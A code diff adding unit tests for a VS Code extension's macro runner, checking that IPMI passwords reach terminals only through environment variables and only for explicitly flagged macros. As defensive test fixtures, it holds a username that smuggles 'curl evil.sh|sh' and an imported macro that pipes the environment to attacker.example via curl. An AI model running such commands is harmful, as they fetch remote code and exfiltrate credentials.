@@ -11,7 +11,8 @@ const showInformationMessage = vi.fn();
 const setStatusBarMessage = vi.fn();
 const executeCommand = vi.fn();
 const openExternal = vi.fn(async () => true);
-const createdTerminals: Array<{ name: string; sent: string[] }> = [];
+const showInputBox = vi.fn();
+const createdTerminals: Array<{ name: string; sent: string[]; env?: Record<string, string>; options: Record<string, unknown> }> = [];
 let openTerminals: Array<{ name: string; sendText: (text: string, addNewLine?: boolean) => void; exitStatus?: unknown }> = [];
 
 vi.mock("vscode", () => ({
@@ -29,8 +30,12 @@ vi.mock("vscode", () => ({
     showInformationMessage: (...args: unknown[]) => showInformationMessage(...args),
     setStatusBarMessage: (...args: unknown[]) => setStatusBarMessage(...args),
     createInputBox: vi.fn(),
-    createTerminal: vi.fn((options: { name: string }) => {
-      const record = { name: options.name, sent: [] as string[] };
+    showInputBox: (...args: unknown[]) => showInputBox(...args),
+    createTerminal: vi.fn((options: { name: string; env?: Record<string, string> }) => {
+      // `env` is recorded as the raw option bag too, so a test can assert the
+      // OPTION IS ABSENT rather than merely falsy — an implementation passing
+      // `env: {}` would satisfy the second and not the first.
+      const record = { name: options.name, sent: [] as string[], env: options.env, options: { ...options } };
       createdTerminals.push(record);
       return {
         name: options.name,
@@ -63,6 +68,7 @@ vi.mock("../../src/commands/serverCommands", () => ({
     arg && typeof arg === "object" && "server" in arg ? (arg as { server: ServerConfig }).server : undefined
 }));
 
+import { collectIncomingMacros } from "../../src/commands/configCommands";
 import { InMemoryMacroStore } from "../../src/storage/inMemoryMacroStore";
 import { setActiveMacroStore } from "../../src/macroSettings";
 import {
@@ -120,6 +126,7 @@ async function setMacros(macros: TerminalMacro[]): Promise<void> {
 beforeEach(async () => {
   registeredCommands.clear();
   showQuickPick.mockReset();
+  showInputBox.mockReset();
   showWarningMessage.mockReset();
   showErrorMessage.mockReset();
   showInformationMessage.mockReset();
@@ -868,5 +875,331 @@ describe("nexus.server.runMacro — connect-first flow", () => {
     // Only the "not connected — connect now?" prompt; no failure copy of either kind.
     expect(warnings()).toHaveLength(1);
     expect(warnings()[0]).toContain("not connected");
+  });
+});
+
+/**
+ * Issue #48 PR-B §3.5 — the IPMI credential opt-in.
+ *
+ * Every fixture here is built to fail against a specific wrong implementation:
+ * the withdrawn "the macro's text mentions an IPMI token, so inject" gate, a
+ * truthiness read of the flag, a prompt that runs before the flag is consulted,
+ * and an implementation that substitutes the password into the TEXT.
+ */
+describe("nexus.server.runMacro — IPMI credential injection (issue #48 §3.3)", () => {
+  const SOL_TEXT = " ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E sol activate\n";
+
+  function ipmiServer(overrides: Partial<ServerConfig> = {}): ServerConfig {
+    return server({ ipmiHost: "10.0.0.9", ipmiAuthProfileId: "ap-1", ...overrides });
+  }
+
+  /** A context whose vault answers with `secrets`, keyed by vault key. */
+  function ipmiContext(secrets: Record<string, string> = {}, profiles: AuthProfile[] = [authProfile()]): CommandContext {
+    return context({
+      core: {
+        getSnapshot: () => ({ activeSessions: [], servers: [] }),
+        getAuthProfile: (id: string) => profiles.find((p) => p.id === id),
+        onDidChange: () => () => {}
+      },
+      secretVault: {
+        get: async (key: string) => secrets[key],
+        store: async () => {},
+        delete: async () => {}
+      }
+    } as unknown as Partial<CommandContext>);
+  }
+
+  const VAULTED = { "auth-profile-password-ap-1": "s3cr3t-bmc" };
+
+  async function pickFirst(): Promise<void> {
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+  }
+
+  it("injects the env pair for a FLAGGED local-terminal macro, and the password appears nowhere in the sent text", async () => {
+    // The test the feature exists to prevent: an implementation that substitutes
+    // the password into the command line puts it in `ps`, in the scrollback and
+    // in TerminalCaptureBuffer — which `nexus.terminal.copyAll` exports.
+    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true }]);
+    await pickFirst();
+
+    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+
+    expect(createdTerminals).toHaveLength(1);
+    expect(createdTerminals[0].env).toEqual({
+      IPMITOOL_PASSWORD: "s3cr3t-bmc",
+      IPMI_PASSWORD: "s3cr3t-bmc"
+    });
+    expect(createdTerminals[0].sent).toEqual([
+      " ipmitool -I lanplus -H 10.0.0.9 -U bmc-operator -E sol activate\n"
+    ]);
+    expect(createdTerminals[0].sent[0]).not.toContain("s3cr3t-bmc");
+    expect(showInputBox).not.toHaveBeenCalled();
+  });
+
+  it("gives an UNFLAGGED macro no environment at all, even though its text uses BOTH IPMI tokens (the finding-1 regression test)", async () => {
+    // Deliberately the maximally tempting case for the WITHDRAWN token-presence
+    // gate: full IPMI token usage, a linked profile, and a vaulted password. An
+    // implementation gated on `profileTokensUsed(macro.text)` hands the
+    // fleet-wide BMC password to this run; the shipped one hands over nothing.
+    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal" }]);
+    await pickFirst();
+
+    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+
+    expect(createdTerminals).toHaveLength(1);
+    // Asserted as ABSENCE of the option, not as a falsy value: `env: {}` would
+    // pass a truthiness assertion while still being a different call.
+    expect("env" in createdTerminals[0].options).toBe(false);
+    // ...and no prompt either — prompting is the same disclosure decision moved
+    // one dialog later.
+    expect(showInputBox).not.toHaveBeenCalled();
+  });
+
+  it("injects for a flagged macro whose text uses NO IPMI token (kills a leftover token-presence condition ANDed onto the flag)", async () => {
+    await setMacros([
+      { id: "a", name: "Custom", text: "ipmitool -H 10.0.0.9 -E chassis power status\n", runIn: "localTerminal", provideIpmiCredentials: true }
+    ]);
+    await pickFirst();
+
+    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+
+    expect(createdTerminals[0].env).toEqual({
+      IPMITOOL_PASSWORD: "s3cr3t-bmc",
+      IPMI_PASSWORD: "s3cr3t-bmc"
+    });
+  });
+
+  it.each([["true"], [1], [{}], ["yes"]])(
+    "treats a non-boolean provideIpmiCredentials (%o) as OFF (kills a truthiness read)",
+    async (rawFlag) => {
+      await setMacros([
+        {
+          id: "a",
+          name: "SOL",
+          text: SOL_TEXT,
+          runIn: "localTerminal",
+          provideIpmiCredentials: rawFlag as unknown as boolean
+        }
+      ]);
+      await pickFirst();
+
+      await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+
+      expect("env" in createdTerminals[0].options).toBe(false);
+      expect(showInputBox).not.toHaveBeenCalled();
+    }
+  );
+
+  it("never injects on a SESSION macro, whatever the flag says", async () => {
+    // The flag is only meaningful for a local terminal; a session send goes to a
+    // remote shell where an extension-host environment variable means nothing,
+    // and the editor never offers the box there.
+    await setMacros([{ id: "a", name: "SOL", text: "show version\n", provideIpmiCredentials: true }]);
+    await pickFirst();
+
+    const sent: string[] = [];
+    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
+    openTerminals = [sessionTerminal];
+    const ctx = ipmiContext(VAULTED);
+    (ctx as unknown as { core: unknown }).core = {
+      getSnapshot: () => ({ activeSessions: [{ id: "sess-1", serverId: "srv-1" }], servers: [] }),
+      getAuthProfile: () => authProfile(),
+      onDidChange: () => () => {}
+    };
+    (ctx.sessionTerminals as Map<string, unknown>).set("sess-1", sessionTerminal);
+
+    await runMacroOnServer(ctx, { server: ipmiServer() });
+
+    expect(createdTerminals).toHaveLength(0);
+    expect(sent).toEqual(["show version\n"]);
+  });
+
+  it("prompts for the password when none is stored, and the answer lands in the env — never in the text", async () => {
+    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true }]);
+    await pickFirst();
+    showInputBox.mockResolvedValue("typed-at-run-time");
+
+    await runMacroOnServer(ipmiContext({}), { server: ipmiServer() });
+
+    expect(showInputBox).toHaveBeenCalledTimes(1);
+    expect((showInputBox.mock.calls[0][0] as { password?: boolean }).password).toBe(true);
+    expect(createdTerminals[0].env).toEqual({
+      IPMITOOL_PASSWORD: "typed-at-run-time",
+      IPMI_PASSWORD: "typed-at-run-time"
+    });
+    expect(createdTerminals[0].sent[0]).not.toContain("typed-at-run-time");
+  });
+
+  it("aborts the whole run when that prompt is cancelled — no terminal, nothing sent", async () => {
+    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true }]);
+    await pickFirst();
+    showInputBox.mockResolvedValue(undefined);
+
+    await runMacroOnServer(ipmiContext({}), { server: ipmiServer() });
+
+    // A terminal without the variable is not what the user asked for: ipmitool
+    // would sit there prompting, or fail, in a window they did not want.
+    expect(createdTerminals).toHaveLength(0);
+    expect(String(setStatusBarMessage.mock.calls[0][0])).toContain("cancelled");
+  });
+
+  it("does NOT prompt for an unflagged macro with no stored password (kills a fallback that prompts before checking the flag)", async () => {
+    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal" }]);
+    await pickFirst();
+
+    await runMacroOnServer(ipmiContext({}), { server: ipmiServer() });
+
+    expect(showInputBox).not.toHaveBeenCalled();
+    expect(createdTerminals).toHaveLength(1);
+    expect("env" in createdTerminals[0].options).toBe(false);
+  });
+
+  it("tells the user why an unflagged IPMI macro will fail, and still runs it", async () => {
+    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal" }]);
+    await pickFirst();
+
+    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+
+    // Runs (a silent no-op would be worse than the failure it is warning about)…
+    expect(createdTerminals).toHaveLength(1);
+    // …and says what to do about it, in the channel that survives to the end of
+    // the run.
+    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join(" ");
+    expect(status).toContain("not set to receive IPMI credentials");
+    expect(status).toContain("Provide IPMI credentials");
+  });
+
+  it("says nothing when a flagged macro runs, or when a local macro has nothing to do with IPMI", async () => {
+    await setMacros([
+      { id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true },
+      { id: "b", name: "Ping", text: "ping ${profile.host}\n", runIn: "localTerminal" }
+    ]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) =>
+      items.find((item) => item.macro.id === "a")
+    );
+    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+    expect(String(setStatusBarMessage.mock.calls[0][0])).not.toContain("IPMI credentials");
+
+    setStatusBarMessage.mockClear();
+    // The scoping sibling: a plain local helper on a server that HAS an IPMI
+    // profile must not be nagged, or the channel is noise and gets ignored.
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) =>
+      items.find((item) => item.macro.id === "b")
+    );
+    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
+    expect(String(setStatusBarMessage.mock.calls[0][0])).not.toContain("IPMI credentials");
+  });
+});
+
+describe("nexus.server.runMacro — ${profile.ipmiUsername}", () => {
+  const MACRO: TerminalMacro = {
+    id: "u",
+    name: "SOL",
+    text: "ipmitool -U ${profile.ipmiUsername} sol activate\n",
+    runIn: "localTerminal"
+  };
+
+  it("resolves through the IPMI link, NOT the SSH one (kills reading either the server's username or its SSH profile's)", async () => {
+    await setMacros([MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+
+    // Three different usernames in play, so every wrong source produces a
+    // visibly different command line.
+    const ctx = contextWithAuthProfiles([
+      authProfile({ id: "ap-ssh", username: "ssh-admin" }),
+      authProfile({ id: "ap-bmc", username: "bmc-operator" })
+    ]);
+    await runMacroOnServer(ctx, {
+      server: server({ username: "local-admin", authProfileId: "ap-ssh", ipmiAuthProfileId: "ap-bmc" })
+    });
+
+    expect(createdTerminals[0].sent).toEqual(["ipmitool -U bmc-operator sol activate\n"]);
+  });
+
+  it("refuses the run when no IPMI profile is linked, naming the field and where to set it", async () => {
+    await setMacros([MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+    showErrorMessage.mockResolvedValue("Edit Server");
+
+    const target = server({ authProfileId: "ap-1" });
+    await runMacroOnServer(contextWithAuthProfiles([authProfile()]), { server: target });
+
+    expect(createdTerminals).toHaveLength(0);
+    const message = String(showErrorMessage.mock.calls[0][0]);
+    expect(message).toContain("IPMI Username");
+    expect(message).toContain("IPMI Auth Profile");
+    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
+  });
+
+  it("refuses a blank profile username rather than sending an empty -U argument", async () => {
+    await setMacros([MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+    showErrorMessage.mockResolvedValue(undefined);
+
+    await runMacroOnServer(contextWithAuthProfiles([authProfile({ id: "ap-bmc", username: "   " })]), {
+      server: server({ ipmiAuthProfileId: "ap-bmc" })
+    });
+
+    expect(createdTerminals).toHaveLength(0);
+    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI Username");
+  });
+
+  it("refuses a profile username carrying shell syntax before anything runs", async () => {
+    await setMacros([MACRO]);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+    showErrorMessage.mockResolvedValue(undefined);
+
+    await runMacroOnServer(
+      contextWithAuthProfiles([authProfile({ id: "ap-bmc", username: "root; curl evil.sh|sh" })]),
+      { server: server({ ipmiAuthProfileId: "ap-bmc" }) }
+    );
+
+    expect(createdTerminals).toHaveLength(0);
+    expect(String(showErrorMessage.mock.calls[0][0])).toContain("can't be placed in a command");
+  });
+});
+
+/**
+ * Issue #48 §3.5 — the credential-harvest regression test, end to end.
+ *
+ * The data half lives in configCommandsMacros.test.ts (the sanitizer drops the
+ * field); this is the half that matters to the user: the RUN path sees the
+ * stripped record and hands over nothing. Stripping is only meaningful if the
+ * runtime agrees, and the two are separated by the whole store.
+ */
+describe("an imported macro cannot arrive pre-armed (issue #48 §3.5)", () => {
+  it("imports a hostile flagged macro and runs it against a fully configured server — no environment, no prompt", async () => {
+    const hostile = {
+      id: "hostile",
+      name: "Check BMC reachability",
+      text: "ping -c1 ${profile.ipmiHost} && env | curl -X POST --data-binary @- https://attacker.example/\n",
+      runIn: "localTerminal",
+      provideIpmiCredentials: true
+    } as unknown as TerminalMacro;
+
+    const incoming = collectIncomingMacros({ version: 2 as const, exportedAt: "", macros: [hostile] });
+    await setMacros(incoming!.macros);
+    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
+
+    const ctx = context({
+      core: {
+        getSnapshot: () => ({ activeSessions: [], servers: [] }),
+        getAuthProfile: () => authProfile(),
+        onDidChange: () => () => {}
+      },
+      secretVault: {
+        get: async () => "s3cr3t-bmc",
+        store: async () => {},
+        delete: async () => {}
+      }
+    } as unknown as Partial<CommandContext>);
+
+    await runMacroOnServer(ctx, { server: server({ ipmiHost: "10.0.0.9", ipmiAuthProfileId: "ap-1" }) });
+
+    expect(createdTerminals).toHaveLength(1);
+    expect("env" in createdTerminals[0].options).toBe(false);
+    expect(showInputBox).not.toHaveBeenCalled();
+    // The password is nowhere in this run at all.
+    expect(createdTerminals[0].sent.join("")).not.toContain("s3cr3t-bmc");
   });
 });
